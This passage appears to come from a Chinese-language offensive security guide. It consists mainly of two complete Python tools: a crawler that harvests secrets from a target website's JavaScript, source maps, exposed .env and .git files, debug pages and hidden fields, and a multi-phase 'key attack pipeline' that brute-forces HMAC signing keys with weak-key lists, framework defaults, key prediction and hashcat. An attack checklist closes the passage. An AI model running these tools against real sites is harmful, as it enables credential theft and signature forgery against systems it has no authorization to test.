
# False positive 过滤
FALSE_POSITIVES = {
    "undefined", "null", "true", "false", "none", "nil", "None",
    "function", "return", "module", "exports", "require",
    "console", "log", "error", "warning", "info",
    "getElementById", "querySelector", "addEventListener",
    "00000000000000000000000000000000",
    "0000000000000000000000000000000000000000000000000000000000000000",
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
}


class KeyExtractor:
    """全自动密钥提取器"""

    def __init__(self, target: str, deep: bool = False):
        self.target = target
        self.deep = deep
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
        })
        self.results: List[Dict] = []
        self.seen_patterns: Set[str] = set()

    def _is_false_positive(self, value: str) -> bool:
        """判断是否是假阳性"""
        if value in FALSE_POSITIVES:
            return True
        if all(c in "0abcdef" for c in value.lower()) and len(value) >= 32:
            return True  # 只有 0-f 的字符串很可能是 hash，但不一定是密钥
        return False

    def _record(self, source: str, pattern: str, value: str, context: str = ""):
        """记录发现的密钥"""
        dedup_key = f"{source}:{value[:40]}"
        if dedup_key in self.seen_patterns:
            return
        self.seen_patterns.add(dedup_key)

        self.results.append({
            "source": source,
            "pattern": pattern,
            "value": value[:100],
            "length": len(value),
            "context": context[:200],
        })

    def _match_patterns(self, content: str, source: str, context_line: str = None):
        """在内容中匹配所有密钥模式"""
        for name, pattern in SECRET_PATTERNS.items():
            for m in pattern.finditer(content):
                value = m.group(1) if m.lastindex else m.group(0)
                if not self._is_false_positive(value):
                    ctx = context_line or content[
                        max(0, m.start() - 50):m.end() + 50
                    ].replace("\n", " ")
                    self._record(source, name, value, ctx)

    # ========== 扫描来源 ==========

    def _scan_url(self, url: str, source_label: str = None):
        """扫描单个 URL 的内容"""
        try:
            r = self.session.get(url, timeout=15)
            if r.status_code != 200:
                return

            content = r.text
            label = source_label or url

            self._match_patterns(content, label)

            # 如果返回 JS，尝试提取 source map 引用
            if url.endswith(".js") or "javascript" in r.headers.get("content-type", ""):
                sm_match = re.search(r'//#\s*sourceMappingURL=(.+\.map)', content)
                if sm_match and self.deep:
                    sm_url = urljoin(url, sm_match.group(1))
                    self._scan_sourcemap(sm_url)
        except requests.RequestException:
            pass

    def _scan_sourcemap(self, map_url: str):
        """扫描 source map"""
        try:
            r = self.session.get(map_url, timeout=15)
            if r.status_code != 200:
                return
            map_data = r.json()
            for idx, source_content in enumerate(map_data.get("sourcesContent", [])):
                if source_content:
                    src_name = map_data.get("sources", [f"source-{idx}"])[idx]
                    self._match_patterns(source_content, f"sourcemap:{src_name}")
        except (requests.RequestException, json.JSONDecodeError):
            pass

    def _scan_html_js(self, base_url: str):
        """爬取 HTML 并提取所有 JS URL"""
        try:
            r = self.session.get(base_url, timeout=15)
            if r.status_code != 200:
                return

            html = r.text
            self._match_patterns(html, f"html:{base_url}")

            # 提取 script src
            for m in re.finditer(r'<script[^>]*src=["\']([^"\']+)["\']', html):
                js_url = urljoin(base_url, m.group(1))
                self._scan_url(js_url)

            # 提取 inline script
            for m in re.finditer(r'<script[^>]*>([^<]+)</script>', html):
                self._match_patterns(m.group(1), f"inline-script:{base_url}")
        except requests.RequestException:
            pass

    def _scan_well_known_paths(self, base_url: str):
        """扫描常见路径"""
        paths = [
            "/.env", "/.env.backup", "/.env.local", "/env",
            "/config.js", "/config.json", "/app.js", "/app-config.js",
            "/settings.js", "/env.js",
            "/index.js", "/main.js", "/bundle.js",
            "/debug", "/whoops", "/_debugbar/",
        ]
        for path in paths:
            url = urljoin(base_url, path)
            label = f"well-known:{path}"
            self._scan_url(url, label)

    def _scan_git_history(self, base_url: str):
        """扫描 .git/config 和可能的 git 历史"""
        if not self.deep:
            return

        git_paths = [
            "/.git/config",
            "/.git/HEAD",
            "/.gitignore",
            "/.git/refs/heads/master",
        ]
        for path in git_paths:
            url = urljoin(base_url, path)
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 and len(r.text) > 10:
                    self._record(f"git:{path}", "git_leak", r.text[:200], url)
            except requests.RequestException:
                pass

    def _scan_page_elements(self, base_url: str):
        """扫描页面的隐藏字段、注释"""
        try:
            r = self.session.get(base_url, timeout=15)
            html = r.text

            # HTML 注释
            for m in re.finditer(r'<!--(.*?)-->', html, re.DOTALL):
                comment = m.group(1).strip()
                for name, pattern in SECRET_PATTERNS.items():
                    for sm in pattern.finditer(comment):
                        value = sm.group(1) if sm.lastindex else sm.group(0)
                        if not self._is_false_positive(value):
                            self._record(f"html-comment:{urlparse(base_url).netloc}",
                                        name, value, comment[:100])

            # 隐藏输入
            for m in re.finditer(
                r'<input[^>]*type=["\']hidden["\'][^>]*value=["\']([^"\']+)["\']',
                html
            ):
                val = m.group(1)
                # 隐藏输入里的哈希值可能是密钥
                if 16 <= len(val) <= 128:
                    self._record("hidden-input", "hidden_input_hash", val)

            # meta tag
            for m in re.finditer(
                r'<meta[^>]*name=["\']?(csrf[-_]?token|csrf[-_]?param)["\']?[^>]*content=["\']([^"\']+)["\']',
                html, re.I
            ):
                val = m.group(2)
                self._record("meta-token", "csrf_token", val)

        except requests.RequestException:
            pass

    # ========== 主流程 ==========

    def extract_all(self) -> List[Dict]:
        """全自动密钥提取"""
        print(f"[*] Starting key extraction on: {self.target}")

        # 判断是 URL 还是本地文件
        if self.target.startswith(("http://", "https://")):
            with ThreadPoolExecutor(max_workers=5) as pool:
                futures = []
                futures.append(pool.submit(self._scan_html_js, self.target))
                futures.append(pool.submit(self._scan_well_known_paths, self.target))
                futures.append(pool.submit(self._scan_git_history, self.target))
                futures.append(pool.submit(self._scan_page_elements, self.target))

                # 额外探测常见 JS bundle 路径
                for js_path in ["/static/js/", "/assets/", "/dist/", "/build/"]:
                    base = urljoin(self.target, js_path)
                    futures.append(pool.submit(self._scan_url, base))

                for f in futures:
                    f.result()
        elif os.path.isfile(self.target):
            with open(self.target, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            self._match_patterns(content, f"file:{os.path.basename(self.target)}")
        else:
            print(f"[-] Invalid target: {self.target}")
            return []

        return self.results

    def report(self):
        """生成报告"""
        print(f"\n{'='*60}")
        print(f"Key Extraction Report — {self.target}")
        print(f"{'='*60}")
        print(f"Total keys found: {len(self.results)}\n")

        # 按来源分组
        by_source = {}
        for r in self.results:
            src = r["source"].split(":")[0] if ":" in r["source"] else r["source"]
            by_source.setdefault(src, []).append(r)

        for src, items in sorted(by_source.items()):
            print(f"\n[{src}] ({len(items)} items)")
            for item in items[:10]:
                print(f"  ├─ {item['pattern']}: {item['value']}")
            if len(items) > 10:
                print(f"  └─ ... and {len(items) - 10} more")

        # 高优先级: hex64 / b64_long / private key
        high = [r for r in self.results if r["pattern"] in
                ("hex64", "hex128", "b64_long", "private_key_block")]
        if high:
            print(f"\n[!] HIGH PRIORITY — {len(high)} strong key candidates:")
            for h in high[:5]:
                print(f"  [!] {h['value']}  (from {h['source']})")


# ========== CLI ==========

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python key_extractor.py <target> [--deep]")
        sys.exit(1)

    target = sys.argv[1]
    deep = "--deep" in sys.argv or "-d" in sys.argv

    extractor = KeyExtractor(target, deep=deep)
    results = extractor.extract_all()
    extractor.report()

    # 输出 JSON
    output_file = f"key_extract_{urlparse(target).netloc if '://' in target else 'local'}.json"
    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Full results saved to: {output_file}")
```

---

## 7. 完整密钥审计脚本

### 7.1 `key_audit.py` — 全自动密钥攻击流水线

```python
#!/usr/bin/env python3
"""
key_audit.py — 全自动密钥攻击流水线

整合所有密钥攻击技术，自动执行多阶段审计:

Phase 1: 密钥发现   — 从目标提取所有可能的密钥
Phase 2: 弱密钥测试  — Top 100 + 框架默认 + 常见模式
Phase 3: 上下文词表  — 从目标信息生成定制词表
Phase 4: 密钥预测    — 时间基 + PRNG + 顺序模式
Phase 5: 密钥重用    — 跨环境/跨服务/多租户检测
Phase 6: 全面爆破    — 多进程 HMAC 爆破 + hashcat
Phase 7: 报告生成    — 合并所有结果

Usage:
    python key_audit.py https://target.com
    python key_audit.py https://target.com --company "AcmeCorp" --app "SuperPay"
    python key_audit.py https://target.com --deep --gpu  (含 source map + hashcat)
"""

import sys, os, json, time, hashlib, hmac, requests, re, itertools
from urllib.parse import urlparse
from typing import List, Dict, Optional
from datetime import datetime

# 引入各模块 (假设同目录或已安装)
# 实际使用时可以合并到一个文件或 from ... import
# from weak_keys_dict import WEAK_KEYS, test_weak_keys
# from framework_default_keys import test_framework_default_keys
# from context_wordlist_gen import generate_context_wordlist
# from time_based_key_predict import predict_time_based_key
# from hmac_brute import brute_force_hmac_wordlist
# from key_extractor import KeyExtractor


# ========== Phase 0: 配置 ==========

AUDIT_CONFIG = {
    "top100_weak_keys": True,
    "framework_defaults": True,
    "common_patterns": True,
    "timestamp_prediction": True,
    "sequential_prediction": True,
    "context_wordlist": True,
    "multi_env_reuse": True,
    "env_scan": True,
    "sourcemap_scan": False,    # 默认不开启，较慢
    "gpu_crack": False,         # 需要 hashcat
    "online_brute": False,      # 在线爆破 (可能触发告警)
}

# 优先级排序
PRIORITY_KEYS = [
    # (来源, 权重)
    ("hex64_key", 10),
    ("hex128_key", 10),
    ("private_key_block", 10),
    ("base64_long", 9),
    ("laravel_app_key", 9),
    ("jwt_secret", 9),
    ("framework_default", 8),
    ("env_file", 8),
    ("git_leak", 8),
    ("js_hardcoded", 7),
    ("hidden_input", 5),
    ("html_comment", 4),
    ("generated_wordlist", 3),
    ("timestamp_predicted", 3),
    ("sequential_predicted", 3),
]


# ========== Phase 1: 密钥发现 ==========

class Phase1_Discovery:
    """Phase 1: 从目标发现密钥"""

    def __init__(self, target: str, deep: bool = False):
        self.target = target
        self.deep = deep
        self.candidates: List[Dict] = []

    def run(self) -> List[Dict]:
        print(f"\n{'='*60}")
        print("Phase 1: Key Discovery")
        print(f"{'='*60}")

        # 1. 使用 key_extractor 扫描
        print("[*] Running key_extractor...")
        try:
            extractor = KeyExtractor(self.target, deep=self.deep)
            self.candidates.extend(extractor.extract_all())
        except Exception as e:
            print(f"[-] key_extractor error: {e}")

        # 2. 扫描 .env 泄露
        if AUDIT_CONFIG["env_scan"]:
            print("[*] Scanning .env exposure...")
            try:
                env_results = scan_env_exposure(self.target, verbose=False)
                for env_file in env_results.get("env", []):
                    # 解析 .env 中的密钥
                    self.candidates.append({
                        "source": f"env_file:{env_file['url']}",
                        "pattern": "env_leak",
                        "value": env_file["preview"][:200],
                        "length": len(env_file["preview"]),
                    })
            except Exception as e:
                print(f"[-] env scan error: {e}")

        # 3. Git 泄露
        if self.deep:
            print("[*] Checking .git leaks...")
            try:
                from env_exposure_scan import GIT_CONFIG_PATHS
                for path in GIT_CONFIG_PATHS:
                    url = urljoin(self.target, path)
                    r = requests.get(url, timeout=10)
                    if r.status_code == 200 and len(r.text) > 10:
                        self.candidates.append({
                            "source": f"git_leak:{path}",
                            "pattern": "git_leak",
                            "value": r.text[:300],
                            "length": len(r.text),
                        })
            except Exception:
                pass

        print(f"[+] Phase 1 complete: {len(self.candidates)} candidates")
        return self.candidates


# ========== Phase 2: 弱密钥测试 ==========

class Phase2_WeakKeyTest:
    """Phase 2: 弱密钥 + 框架默认 + 常见模式测试"""

    def __init__(self, data: bytes, target_signature: str, method: str = "sha256"):
        self.data = data
        self.target_sig = target_signature
        self.method = method
        self.matched_key = None

    def _test_key(self, key: str, label: str) -> bool:
        """测试单个密钥"""
        h = hmac.new(key.encode(), self.data, getattr(hashlib, self.method))
        if h.hexdigest() == self.target_sig:
            print(f"[!] MATCH [{label}]: {repr(key)}")
            self.matched_key = (label, key)
            return True
        return False

    def run(self) -> Optional[str]:
        print(f"\n{'='*60}")
        print("Phase 2: Weak Key Testing")
        print(f"{'='*60}")

        # 2.1 Top 100 弱密钥
        if AUDIT_CONFIG["top100_weak_keys"]:
            print(f"[*] Testing {len(WEAK_KEYS)} weak keys...")
            for key in WEAK_KEYS:
                if self._test_key(key, "top100"):
                    return key

        # 2.2 框架默认密钥
        if AUDIT_CONFIG["framework_defaults"]:
            print("[*] Testing framework default keys...")
            all_fw_keys = []
            for fw, keys in [
                ("Laravel", LARAVEL_WEAK_PATTERNS),
                ("Django", DJANGO_WEAK_PATTERNS),
                ("Flask", FLASK_WEAK_PATTERNS),
                ("Express", EXPRESS_WEAK_PATTERNS),
                ("Rails", RAILS_WEAK_PATTERNS),
            ]:
                for k in keys:
                    all_fw_keys.append((fw, k))

            for fw, k in all_fw_keys:
                if self._test_key(k, f"framework:{fw}"):
                    return k

        # 2.3 常见模式
        if AUDIT_CONFIG["common_patterns"]:
            print("[*] Generating common pattern keys...")
            pattern_keys = generate_key_patterns()
            print(f"[*] Testing {len(pattern_keys)} common patterns...")
            for k in pattern_keys:
                if self._test_key(k, "common_pattern"):
                    return k

        print(f"[-] Phase 2 complete: no weak key matched")
        return None


# ========== Phase 3: 上下文词表生成 ==========

class Phase3_ContextWordlist:
    """Phase 3: 从目标上下文生成定制词表"""

    def __init__(self, domain: str = "", company: str = "",
                 app_name: str = "", extra: List[str] = None):
        self.domain = domain or ""
        self.company = company or ""
        self.app_name = app_name or ""
        self.extra = extra or []

    def run(self) -> List[str]:
        print(f"\n{'='*60}")
        print("Phase 3: Context Wordlist Generation")
        print(f"{'='*60}")

        if not any([self.domain, self.company, self.app_name, self.extra]):
            print("[*] No context provided, skipping...")
            return []

        wordlist = generate_context_wordlist(
            domain=self.domain,
            company=self.company,
            app_name=self.app_name,
            extra=self.extra
        )

        print(f"[+] Generated {len(wordlist)} context-specific keys")
        return list(wordlist)


# ========== Phase 4: 密钥预测 ==========

class Phase4_KeyPrediction:
    """Phase 4: 时间基 + PRNG + 顺序模式预测"""

    def run(self, known_keys: List[str] = None) -> List[str]:
        print(f"\n{'='*60}")
        print("Phase 4: Key Prediction")
        print(f"{'='*60}")
        predictions = []

        # 4.1 时间基预测
        if AUDIT_CONFIG["timestamp_prediction"]:
            print("[*] Predicting time-based keys...")
            time_keys = predict_time_based_key(
                known_timestamp=datetime.utcnow(),
                window_days=3,
                secret_suffixes=["secret", "key", "", "sign", "hmac", "token"]
            )
            predictions.extend(time_keys)
            print(f"[+] {len(time_keys)} time-based predictions")

        # 4.2 顺序模式预测
        if AUDIT_CONFIG["sequential_prediction"] and known_keys:
            print("[*] Analyzing sequential patterns...")
            pattern = detect_sequential_pattern(known_keys)
            if pattern:
                print(f"[!] Sequential pattern detected: {pattern}")
                next_key = predict_next_sequential_key(known_keys[-1])
                predictions.extend(next_key)
                print(f"[+] Predicted next key(s): {next_key[:5]}")

        return list(dict.fromkeys(predictions))


# ========== Phase 5: 全面爆破 ==========

class Phase5_BruteForce:
    """Phase 5: 多进程 + GPU 爆破"""

    def __init__(self, data: bytes, target_sig: str, method: str = "sha256"):
        self.data = data
        self.target_sig = target_sig
        self.method = method

    def run(self, wordlist: List[str] = None) -> Optional[str]:
        print(f"\n{'='*60}")
        print("Phase 5: Brute Force")
        print(f"{'='*60}")

        if not wordlist:
            print("[-] No wordlist to brute force")
            return None

        # 5.1 多进程爆破
        print(f"[*] Running multiprocess brute force ({len(wordlist)} keys)...")
        try:
            result = brute_force_hmac_wordlist(
                self.data, self.target_sig, wordlist, self.method
            )
            if result:
                print(f"[!] KEY FOUND via brute force: {repr(result)}")
                return result
        except Exception as e:
            print(f"[-] Brute force error: {e}")

        # 5.2 GPU 加速 (可选)
        if AUDIT_CONFIG["gpu_crack"] and len(wordlist) > 100000:
            print(f"[*] Launching hashcat GPU cracking...")
            try:
                gpu_result = hashcat_hmac_bruteforce(
                    data_hex=self.data.hex(),
                    target_sig=self.target_sig,
                    method=self.method,
                    wordlist="/tmp/wordlist.txt"  # 需要先写文件
                )
                print(f"[+] hashcat result: {gpu_result.get('cracked')}")
            except Exception as e:
                print(f"[-] hashcat error: {e}")

        return None


# ========== Phase 6: 密钥重用检测 ==========

class Phase6_KeyReuse:
    """Phase 6: 环境间/服务间密钥重用检测"""

    def __init__(self, target: str):
        self.target = target

    def run(self) -> Dict:
        print(f"\n{'='*60}")
        print("Phase 6: Key Reuse Detection")
        print(f"{'='*60}")

        findings = {}

        # 尝试常见的 dev/staging/prod 子域名
        parsed = urlparse(self.target)
        netloc = parsed.netloc

        for prefix in ["dev", "staging", "stage", "test", "sandbox",
                        "api-dev", "api-staging", "api-sandbox"]:
            dev_url = f"{parsed.scheme}://{prefix}.{netloc}"
            try:
                r = requests.get(dev_url, timeout=5)
                if r.status_code < 500:
                    findings[prefix] = {
                        "url": dev_url,
                        "status": r.status_code,
                        "available": True
                    }
            except requests.RequestException:
                pass

        if findings:
            print(f"[!] Found {len(findings)} potential environment endpoints")
            for env, info in findings.items():
                print(f"    {env}: {info['url']} ({info['status']})")

        return findings


# ========== 主审计器 ==========

class KeyAuditor:
    """全自动密钥审计主控制器"""

    def __init__(self, target: str, **kwargs):
        self.target = target
        self.company = kwargs.get("company", "")
        self.app_name = kwargs.get("app_name", "")
        self.deep = kwargs.get("deep", False)
        self.data = kwargs.get("data", b"test_data_for_hmac")
        self.target_sig = kwargs.get("target_sig", "")
        self.sign_method = kwargs.get("method", "sha256")
        self.results = {
            "target": target,
            "started_at": datetime.utcnow().isoformat(),
            "phases": {},
            "found_key": None,
            "summary": {},
        }

    def _has_signature(self) -> bool:
        """检查是否提供了目标签名用于验证"""
        return bool(self.target_sig) and len(self.target_sig) >= 32

    def run(self):
        """执行完整密钥审计流水线"""

        print(f"""
╔══════════════════════════════════════════════════════════╗
║              KEY AUDIT ENGINE v1.0                       ║
╠══════════════════════════════════════════════════════════╣
║  Target:     {self.target:<50}║
║  Company:    {self.company or '(not set)':<50}║
║  App:        {self.app_name or '(not set)':<50}║
║  Deep scan:  {self.deep:<50}║
║  Has sig:    {self._has_signature():<50}║
╚══════════════════════════════════════════════════════════╝
        """)

        # Phase 1: 密钥发现
        p1 = Phase1_Discovery(self.target, self.deep)
        discovered = p1.run()
        self.results["phases"]["discovery"] = {
            "candidates": len(discovered),
            "items": discovered[:30],
        }

        # Phase 6: 密钥重用 (先做，因为不需要签名)
        p6 = Phase6_KeyReuse(self.target)
        reuse_findings = p6.run()
        self.results["phases"]["key_reuse"] = reuse_findings

        # 如果有目标签名 → 进行验证
        if self._has_signature():
            # Phase 2: 弱密钥测试
            p2 = Phase2_WeakKeyTest(self.data, self.target_sig, self.sign_method)
            matched = p2.run()
            if matched:
                self.results["found_key"] = {"phase": "weak_key", "key": matched}
                self.results["summary"]["key_found"] = True
                self._print_summary()
                return

            # Phase 3: 上下文词表
            domain = urlparse(self.target).netloc if "://" in self.target else ""
            p3 = Phase3_ContextWordlist(
                domain=domain,
                company=self.company,
                app_name=self.app_name
            )
            context_keys = p3.run()

            # Phase 4: 密钥预测
            p4 = Phase4_KeyPrediction()
            predicted = p4.run(known_keys=discovered[:10])

            # 合并词表
            all_keys = list(dict.fromkeys(
                discovered + context_keys + predicted
            ))
            key_strings = []
            for item in discovered:
                if isinstance(item, dict) and "value" in item:
                    v = item["value"]
                    if isinstance(v, str) and 8 <= len(v) <= 128:
                        key_strings.append(v)
            key_strings += context_keys + predicted
            key_strings = list(dict.fromkeys(key_strings))

            # Phase 5: 爆破
            p5 = Phase5_BruteForce(self.data, self.target_sig, self.sign_method)
            found = p5.run(wordlist=key_strings)
            if found:
                self.results["found_key"] = {"phase": "brute_force", "key": found}
                self.results["summary"]["key_found"] = True
            else:
                self.results["summary"]["key_found"] = False
        else:
            print("\n[*] No target signature provided — skipping validation phases (2-5).")
            print("[*] Use --sig <hex_sig> --data <hex_data> to enable key cracking.")

        self._print_summary()

    def _print_summary(self):
        """打印审计摘要"""
        elapsed = (datetime.utcnow() - datetime.fromisoformat(
            self.results["started_at"])).total_seconds()

        print(f"\n{'='*60}")
        print("KEY AUDIT COMPLETE")
        print(f"{'='*60}")
        print(f"  Target:       {self.target}")
        print(f"  Duration:     {elapsed:.1f}s")
        print(f"  Key found:    {self.results['summary'].get('key_found', 'N/A')}")

        if self.results.get("found_key"):
            print(f"  Key value:    {self.results['found_key']['key']}")
            print(f"  Found in:     {self.results['found_key']['phase']}")
        else:
            print(f"  Key status:   NOT FOUND in available wordlists")

        envs = self.results.get("phases", {}).get("key_reuse", {})
        if envs:
            print(f"  Other envs:   {len(envs)} found")

        # 写入报告文件
        report_name = f"key_audit_{urlparse(self.target).netloc if '://' in self.target else 'local'}.json"
        with open(report_name, "w") as f:
            json.dump(self.results, f, indent=2, default=str)
        print(f"  Report:       {report_name}")


# ========== CLI ==========

def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="Key Audit Engine — 全自动密钥攻击流水线",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # 基础审计 (仅密钥发现)
  python key_audit.py https://target.com

  # 带签名验证的完整审计
  python key_audit.py https://target.com \\
      --sig abc123def456... \\
      --data 746573745f64617461

  # 深扫描 + 上下文词表
  python key_audit.py https://target.com --deep \\
      --company "Acme" --app "SuperPay"

  # 离线审计: 只给签名和数据，不扫 URL
  python key_audit.py --sig abc123... --data 74657374

  # GPU 加速爆破
  python key_audit.py https://target.com \\
      --sig abc123... --data 74657374 --gpu
        """
    )
    parser.add_argument("target", nargs="?", help="Target URL or file path")
    parser.add_argument("--deep", "-d", action="store_true",
                       help="Deep scan (source map, git, full env)")
    parser.add_argument("--gpu", action="store_true",
                       help="Enable GPU acceleration (requires hashcat)")
    parser.add_argument("--company", help="Company name for context wordlist")
    parser.add_argument("--app", help="App name for context wordlist")
    parser.add_argument("--sig", help="Target signature hex string")
    parser.add_argument("--data", help="HMAC input data hex string")
    parser.add_argument("--method", default="sha256",
                       choices=["sha256", "sha1", "md5"],
                       help="HMAC method (default: sha256)")

    args = parser.parse_args()

    # 激活 GPU 配置
    if args.gpu:
        AUDIT_CONFIG["gpu_crack"] = True

    # 构造审计器
    auditor = KeyAuditor(
        target=args.target or "cli-only",
        company=args.company or "",
        app_name=args.app or "",
        deep=args.deep,
        data=bytes.fromhex(args.data) if args.data else b"test_data",
        target_sig=args.sig or "",
        method=args.method,
    )

    auditor.run()


if __name__ == "__main__":
    main()
```

---

## 实战检查清单

```
[ ] .env 泄露 (/.env, /.env.backup, /.env.local)
[ ] JS bundle 密钥 (npm run build → 扫描 dist/)
[ ] Source map 泄露 (*.js.map 可访问)
[ ] 框架默认密钥 (Laravel APP_KEY, Django SECRET_KEY, Flask secret_key)
[ ] Git 历史包含密钥 (/.git/config, git log -p)
[ ] Docker 环境变量暴露 (docker inspect, docker-compose.yml)
[ ] CI/CD 日志泄露 (GitHub Actions public logs)
[ ] Error page 显示密钥 (debug mode, Whoops, Debugbar)
[ ] Electron ASAR 未加密 (npx asar extract app.asar)
[ ] Android APK 字符串硬编码 (strings app.apk | grep -i key)
[ ] 弱密钥: Top 100 字典
[ ] 弱密钥: base64("secret"), hex("key"), MD5("password")
[ ] 弱密钥: 空字符串, "secret", "key", "null"
[ ] 可预测密钥: key = md5(date("Y-m-d"))
[ ] 可预测密钥: key = str(random.getrandbits(32))
[ ] 可预测密钥: 顺序编号 KEY_001, KEY_002, ...
[ ] 密钥重用: dev == staging == prod
[ ] 密钥重用: 支付签名 == JWT secret == Session secret
[ ] 密钥重用: 沙箱密钥 == 生产密钥
[ ] 多租户密钥重用: tenant1.key == tenant2.key
[ ] 密钥爆破: 多进程 HMAC brute force
[ ] 密钥爆破: hashcat GPU 加速
[ ] 密钥爆破: 目标上下文定制词表
[ ] Redis 未授权访问 → KEYS *
[ ] SSRF → Redis → 读取密钥
```

---

## 关联文件

- [01-algorithm.md](01-algorithm.md) — 签名算法基础 (密钥空间分析)
- [02-implementation.md](02-implementation.md) — 实现缺陷 (密钥比较漏洞)
- [04-canonicalization.md](04-canonicalization.md) — 规范化攻击 (密钥注入)
- [05-length-extension.md](05-length-extension.md) — 长度扩展攻击 (需要密钥)
- [12-payment/payment-callback-async.md](../12-payment/payment-callback-async.md) — 回调签名密钥
- [02-auth/jwt/](../02-auth/jwt/) — JWT 密钥攻击
